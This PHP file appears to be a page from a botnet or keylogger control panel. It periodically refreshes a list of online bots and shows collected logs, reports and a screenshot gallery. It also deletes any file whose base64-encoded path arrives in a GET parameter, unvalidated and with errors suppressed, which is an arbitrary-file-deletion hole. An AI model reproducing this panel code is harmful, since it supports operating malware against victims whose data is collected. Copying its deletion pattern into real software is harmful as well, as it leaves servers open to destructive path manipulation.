<?php
session_start();

require_once('inc/session.php');
require_once('inc/config.php');
require_once('inc/html_grund.php');

echo '<link rel="stylesheet" type="text/css" href="css/stylex.css"/>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#nav\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>';

if ($_GET['cmd'] == "Z2FsbGVyeQ==")
  {
    require_once('inc/gallery.php');
  }
else
  {
    if (isset($_GET['del']))
      {
        $dfile = base64_decode($_GET['del']);
        $ppath = $_GET['pp'];
        @unlink($dfile);
        if (isset($_GET['gg']))
         {
           require_once('inc/gallery.php');
         } 
        else
         {	
        echo '<meta http-equiv="Refresh" content="0;url=reports.php?p=' . $ppath . '">';
         }
      }
    else
      {
        require_once('inc/logs.php');
      }
  }




require_once('inc/html_footer.php');

?>